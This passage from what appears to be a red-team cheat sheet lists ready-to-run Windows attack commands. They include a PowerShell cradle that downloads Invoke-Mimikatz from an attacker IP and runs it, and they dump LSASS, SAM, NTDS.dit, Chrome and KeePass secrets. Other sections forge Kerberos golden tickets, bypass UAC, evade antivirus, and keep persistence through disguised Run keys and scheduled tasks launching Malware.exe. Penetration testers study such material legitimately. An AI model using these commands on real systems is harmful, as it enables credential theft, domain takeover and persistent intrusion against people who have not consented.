<h2 id="5-5-Dump-Creds"><a href="#5-5-Dump-Creds" class="headerlink" title="5.5 Dump Creds"></a>5.5 Dump Creds</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(new-object System.Net.WebClient).DownloadString(&apos;http://10.10.14.5:8000/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz </span><br><span class="line"></span><br><span class="line">Can also run Mimikatz.exe after some AV Evasion removing strings etc. ippSec has a great tutorial on this.</span><br><span class="line"></span><br><span class="line">mimikatz.exe</span><br><span class="line">privlege::debug</span><br><span class="line">sekurlsa::logonPasswords full</span><br><span class="line"></span><br><span class="line">The safer method is to dump the process memory of LSASS.exe with MiniDump </span><br><span class="line">(https://github.com/3xpl01tc0d3r/Minidump)</span><br><span class="line"></span><br><span class="line">(or) https://github.com/GhostPack/SharpDump</span><br><span class="line"></span><br><span class="line">and send the .bin to Mimikatz locally.</span><br><span class="line"></span><br><span class="line">sekurlsa::minidump C:\users\m0chan\lssas.dmp</span><br><span class="line"></span><br><span class="line">Can also be used for dumping and pass the ticket attacks but will cover this elsewhere.</span><br><span class="line"></span><br><span class="line">Mimikatz Guide</span><br><span class="line"></span><br><span class="line">#Logon Sessions</span><br><span class="line"></span><br><span class="line">sekurlsa::logonPasswords all</span><br><span class="line"></span><br><span class="line">#Dump Cache</span><br><span class="line"></span><br><span class="line">lsadump::cache</span><br><span class="line"></span><br><span class="line">#Dump SAM</span><br><span class="line"></span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>

<h2 id="5-6-Dump-Creds-2"><a href="#5-6-Dump-Creds-2" class="headerlink" title="5.6 Dump Creds #2"></a>5.6 Dump Creds #2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/AlessandroZ/LaZagne</span><br><span class="line"></span><br><span class="line">laZagne.exe all</span><br><span class="line">laZagne.exe browsers</span><br><span class="line">laZagne.exe browsers -firefox</span><br></pre></td></tr></table></figure>

<h2 id="5-7-SessionGopher"><a href="#5-7-SessionGopher" class="headerlink" title="5.7 SessionGopher"></a>5.7 SessionGopher</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Arvanaghi/SessionGopher</span><br><span class="line"></span><br><span class="line">Quietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP</span><br><span class="line"></span><br><span class="line">SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminals</span><br><span class="line"></span><br><span class="line">Invoke-SessionGopher -Thorough</span><br><span class="line"></span><br><span class="line">Import-Module path\to\SessionGopher.ps1;</span><br><span class="line">Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss</span><br></pre></td></tr></table></figure>

<h2 id="5-8-Dump-Chrome密码（也发布漏洞利用程序）"><a href="#5-8-Dump-Chrome密码（也发布漏洞利用程序）" class="headerlink" title="5.8 Dump Chrome密码（也发布漏洞利用程序）"></a>5.8 Dump Chrome密码（也发布漏洞利用程序）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#git clone https://github.com/rasta-mouse/CookieMonster</span><br><span class="line"></span><br><span class="line">CookieMonster creds</span><br><span class="line">CookieMonster.exe cookies -d [domain] -e </span><br><span class="line">CookieMonster -a </span><br><span class="line"></span><br><span class="line">Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.</span><br><span class="line"></span><br><span class="line">Can also use Mimikatz for this.</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotect</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect</span><br></pre></td></tr></table></figure>

<h2 id="5-9-Dump-Process-Memory-w-Mimikittenz"><a href="#5-9-Dump-Process-Memory-w-Mimikittenz" class="headerlink" title="5.9 Dump Process Memory w/ Mimikittenz"></a>5.9 Dump Process Memory w/ Mimikittenz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/putterpanda/mimikittenz</span><br><span class="line"></span><br><span class="line">mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.</span><br><span class="line"></span><br><span class="line">The aim of mimikittenz is to provide user-level (non-admin privileged) sensitive data extraction in order to maximise post exploitation efforts and increase value of information gathered per target.</span><br><span class="line"></span><br><span class="line">Invoke-Mimikittenz</span><br></pre></td></tr></table></figure>

<h2 id="5-10-Dump-KeePass"><a href="#5-10-Dump-KeePass" class="headerlink" title="5.10 Dump KeePass"></a>5.10 Dump KeePass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HarmJ0y/KeeThief</span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</span><br><span class="line"></span><br><span class="line">Get-Process keepass</span><br><span class="line">tasklist | findstr keepass</span><br><span class="line"></span><br><span class="line">Attacking KeePass</span><br><span class="line"></span><br><span class="line">#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1</span><br><span class="line">Import-Module KeeThief.ps1</span><br><span class="line">Get-KeePassDatabaseKey -Verbose</span><br><span class="line"></span><br><span class="line">KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.</span><br></pre></td></tr></table></figure>

<h2 id="5-11-pypykatz"><a href="#5-11-pypykatz" class="headerlink" title="5.11 pypykatz"></a>5.11 pypykatz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/skelsec/pypykatz</span><br><span class="line"></span><br><span class="line">Full python implementation of Mimikatz :D </span><br><span class="line"></span><br><span class="line">pip3 install pypykatz</span><br></pre></td></tr></table></figure>

<h2 id="5-12-SafetyKatz"><a href="#5-12-SafetyKatz" class="headerlink" title="5.12 SafetyKatz"></a>5.12 SafetyKatz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SafetyKatz</span><br><span class="line"></span><br><span class="line">Full C Sharp Implemenatation of Mimikatz that can be reflectively loaded :D </span><br><span class="line"></span><br><span class="line">&quot;SafetyKatz is a combination of slightly modified version of @gentilkiwis Mimikatz project and @subtee&apos;s .NET PE Loader.</span><br><span class="line"></span><br><span class="line">First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtees PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete.&quot;</span><br></pre></td></tr></table></figure>

<h2 id="5-13-SharpDPAPI"><a href="#5-13-SharpDPAPI" class="headerlink" title="5.13 SharpDPAPI"></a>5.13 SharpDPAPI</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SharpDPAPI</span><br><span class="line"></span><br><span class="line">Full C Sharp Implementation of Mimikatzs DPAPI features which allows access to DPAPI features.</span><br></pre></td></tr></table></figure>

<h2 id="5-14-SharpSniper"><a href="#5-14-SharpSniper" class="headerlink" title="5.14 SharpSniper"></a>5.14 SharpSniper</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HunnicCyber/SharpSniper</span><br><span class="line"></span><br><span class="line">Often a Red Team engagement is more than just achieving Domain Admin. Some clients will want to see if specific users in the domain can be compromised, for example the CEO.</span><br><span class="line"></span><br><span class="line">SharpSniper is a simple tool to find the IP address of these users so that you can target their box.</span><br><span class="line"></span><br><span class="line">C:\&gt; SharpSniper.exe emusk DomainAdminUser DAPass123</span><br><span class="line"></span><br><span class="line">User: emusk - IP Address: 192.168.37.130</span><br></pre></td></tr></table></figure>

<h2 id="5-15-SharpLocker"><a href="#5-15-SharpLocker" class="headerlink" title="5.15 SharpLocker"></a>5.15 SharpLocker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Pickfordmatt/SharpLocker</span><br><span class="line"></span><br><span class="line">SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike.</span><br></pre></td></tr></table></figure>

<h2 id="5-16-Check-for-Missing-KB’s"><a href="#5-16-Check-for-Missing-KB’s" class="headerlink" title="5.16 Check for Missing KB’s"></a>5.16 Check for Missing KB’s</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">watson.exe</span><br><span class="line">Sherlock.ps1</span><br><span class="line"></span><br><span class="line">Use Watson.exe Assembly and reflectively load .NET Assembly into memory to avoid antivirus. </span><br><span class="line"></span><br><span class="line">More at the bottom re. Reflectively Loading stuff. (Also does not hurt to change certain strings etc)</span><br><span class="line"></span><br><span class="line">https://github.com/rasta-mouse/Watson</span><br></pre></td></tr></table></figure>

<h2 id="5-17-如果管理员-系统，则使用Mimikatz解密EFS文件"><a href="#5-17-如果管理员-系统，则使用Mimikatz解密EFS文件" class="headerlink" title="5.17 如果管理员/系统，则使用Mimikatz解密EFS文件"></a>5.17 如果管理员/系统，则使用Mimikatz解密EFS文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files</span><br><span class="line"></span><br><span class="line">cipher /c &quot;d:\Users\Gentil Kiwi\Documents\m0chan.txt&quot; - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.</span><br><span class="line"></span><br><span class="line">privilege::debug </span><br><span class="line">token::elevate </span><br><span class="line">crypto::system /file:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\B53C6DE283C00203587A03DD3D0BF66E16969A55&quot; /export</span><br><span class="line"></span><br><span class="line">dpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot;</span><br><span class="line"></span><br><span class="line">dpapi::masterkey /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Protect\S-1-5-21-494464150-3436831043-1864828003-1001\1eccdbd2-4771-4360-8b19-9d6060a061dc&quot; /password:waza1234/</span><br><span class="line"></span><br><span class="line">dpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot; /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b</span><br><span class="line"></span><br><span class="line">openssl x509 -inform DER -outform PEM -in B53C6DE283C00203587A03DD3D0BF66E16969A55.der -out public.pem</span><br><span class="line"></span><br><span class="line">openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_ffb75517-bc6c-4a40-8f8b-e2c555e30e34.pvk -out private.pem</span><br><span class="line"></span><br><span class="line">openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br><span class="line"></span><br><span class="line">certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot</span><br></pre></td></tr></table></figure>

<h2 id="5-18-UAC绕过"><a href="#5-18-UAC绕过" class="headerlink" title="5.18 UAC绕过"></a>5.18 UAC绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://egre55.github.io/system-properties-uac-bypass/ - Read Ghoul writeup on HTB for more Info </span><br><span class="line"></span><br><span class="line">findstr /C:&quot;&lt;autoElevate&gt;true&quot; </span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesComputerName.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesHardware.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesProtection.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesRemote.exe</span><br></pre></td></tr></table></figure>

<h2 id="5-19-Golden-Ticket-Attack"><a href="#5-19-Golden-Ticket-Attack" class="headerlink" title="5.19 Golden Ticket Attack"></a>5.19 Golden Ticket Attack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br><span class="line"></span><br><span class="line"># To generate the TGT with NTLM</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># To generate the TGT with AES 128 key</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># Inject TGT with Mimikatz</span><br><span class="line">mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Inject Ticket with Rebeus</span><br><span class="line">.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;</span><br><span class="line"></span><br><span class="line">.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd</span><br></pre></td></tr></table></figure>

<h2 id="5-20-子域将危害森林"><a href="#5-20-子域将危害森林" class="headerlink" title="5.20 子域将危害森林"></a>5.20 子域将危害森林</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Domain = Logical group of objects (users, computers, servers etc etc) supported from a central location like a DC</span><br><span class="line"></span><br><span class="line">Tree = Set of domains using same name space (DNS Name)</span><br><span class="line"></span><br><span class="line">Trust = Agreement between 2 domains that allow cross-domain access to resources etc. i/e Michelle@dev.m0chan.com may be able to access resources inside HR.m0chan.com.</span><br><span class="line"></span><br><span class="line">Forest = Largest Structure composed of all trees.</span><br><span class="line"></span><br><span class="line">Most trees are linked with dual sided trust relationships to allow for sharing of resources.</span><br><span class="line"></span><br><span class="line">By default the first domain created if the Forest Root.</span><br><span class="line"></span><br><span class="line">Lets say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create </span><br><span class="line"></span><br><span class="line">Covert-NameToSid target.domain.com\krbtgt</span><br><span class="line">S-1-5-21-2941561648-383941485-1389968811-502</span><br><span class="line"></span><br><span class="line">Replace 502 with 519 to represent Enterprise Admins</span><br><span class="line"></span><br><span class="line">Create golden ticket and attack parent domain. </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">This will not work if there is SID Filtering in place for respective target domain.</span><br><span class="line"></span><br><span class="line">harmj0ys article explains it best. </span><br><span class="line"></span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/</span><br></pre></td></tr></table></figure>

<h2 id="5-21-Dump-NTDS-dit"><a href="#5-21-Dump-NTDS-dit" class="headerlink" title="5.21 Dump NTDS.dit"></a>5.21 Dump NTDS.dit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\vssadmin create shadow /for=C:</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit</span><br><span class="line">.</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM</span><br><span class="line">.</span><br><span class="line">copy \\?</span><br><span class="line">\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SAM</span><br><span class="line">.</span><br><span class="line">reg SAVE HKLM\SYSTEM c:\SYS</span><br><span class="line">vssadmin delete shadows /for= [/oldest | /all | /shadow=]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit</span><br></pre></td></tr></table></figure>

<h2 id="5-22-SeBackupPrivlege-Dump-NTDS-dit"><a href="#5-22-SeBackupPrivlege-Dump-NTDS-dit" class="headerlink" title="5.22 SeBackupPrivlege - Dump NTDS.dit"></a>5.22 SeBackupPrivlege - Dump NTDS.dit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">Import-Module .\SeBackupPrivilegeUtils.dll</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Get-SeBackupPrivilege</span><br><span class="line">SeBackupPrivilege is disabled</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Set-SeBackupPrivilege</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Get-SeBackupPrivilege</span><br><span class="line">SeBackupPrivilege is enabled</span><br><span class="line"></span><br><span class="line">PS C:\m0chan&gt; Copy-FileSeBackupPrivilege P:\Windows\System32\ntds.dit C:\m0chan\ntds.dit -Overwrite</span><br><span class="line">Copied 12582912 bytes</span><br><span class="line"></span><br><span class="line">Use diskshadow to mount a shadow copy and then copy Windows\system32\ntds.dit </span><br><span class="line"></span><br><span class="line">Remember and not use C:\Windows\ntds\ntds.dit</span><br><span class="line"></span><br><span class="line">reg.exe save hklm\system c:\m0chan\SYSTEM.bak</span><br></pre></td></tr></table></figure>

<h1 id="0x06-权限维持"><a href="#0x06-权限维持" class="headerlink" title="0x06 权限维持"></a>0x06 权限维持</h1><h2 id="6-1-SSH-Shuttle"><a href="#6-1-SSH-Shuttle" class="headerlink" title="6.1 SSH Shuttle"></a>6.1 SSH Shuttle</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run -r root@10.10.110.123 172.16.1.0/24 -e &quot;ssh -i Root.key&quot;</span><br></pre></td></tr></table></figure>

<h2 id="6-2-SharPersist"><a href="#6-2-SharPersist" class="headerlink" title="6.2 SharPersist"></a>6.2 SharPersist</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/fireeye/SharPersist</span><br><span class="line"></span><br><span class="line">C# Libary Designed by FireEye to aid with Persistance using various techniques such as </span><br><span class="line"></span><br><span class="line">KeePass Backdoor</span><br><span class="line">Reg Key</span><br><span class="line">Sch Task Backdoor</span><br><span class="line">Startup Folder (Link File)</span><br><span class="line">Service Backdoor</span><br><span class="line"></span><br><span class="line">See there github linked above for full Syntax, very cool work</span><br></pre></td></tr></table></figure>

<h2 id="6-3-SharpDoor"><a href="#6-3-SharpDoor" class="headerlink" title="6.3 SharpDoor"></a>6.3 SharpDoor</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/infosecn1nja/SharpDoor.git</span><br><span class="line"></span><br><span class="line">SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently only support for Windows 10.</span><br><span class="line"></span><br><span class="line">execute-assembly /root/Toolkits/SharpBinaries/SharpDoor.exe</span><br></pre></td></tr></table></figure>

<h2 id="6-4-自动运行注册表"><a href="#6-4-自动运行注册表" class="headerlink" title="6.4 自动运行注册表"></a>6.4 自动运行注册表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]</span><br><span class="line">[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]</span><br></pre></td></tr></table></figure>

<h2 id="6-5-Run-amp-Run-Once"><a href="#6-5-Run-amp-Run-Once" class="headerlink" title="6.5 Run &amp; Run Once"></a>6.5 Run &amp; Run Once</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v WindowsUpdate</span><br><span class="line">/t REG_SZ /d &quot;C:\Temp\SoftwareUpdate\Malware.exe&quot;</span><br></pre></td></tr></table></figure>

<h2 id="6-6-计划任务"><a href="#6-6-计划任务" class="headerlink" title="6.6 计划任务"></a>6.6 计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Note - Beaware. some EDR/Endpoint Solutions detect Scheduled Tasks being created and trigger alerts.</span><br><span class="line"></span><br><span class="line">schtasks /create /sc minute /mo 1 /tn &quot;Malware&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe</span><br><span class="line"></span><br><span class="line">This will run Malware.exe every minute forever.</span><br><span class="line"></span><br><span class="line"># Run Malware.exe every day at 06:00am</span><br><span class="line">schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc daily /st 06:00</span><br><span class="line"></span><br><span class="line"># Runs a task each time the user&apos;s session is idle for 5 minutes.</span><br><span class="line">schtasks /create /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onidle /i 5</span><br><span class="line"></span><br><span class="line"># Runs a a task as SYSTEM when User Logs in.</span><br><span class="line">schtasks /create /ru &quot;NT AUTHORITY\SYSTEM&quot; /rp &quot;&quot; /tn &quot;SoftwareUpdate&quot; /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onlogon</span><br></pre></td></tr></table></figure>

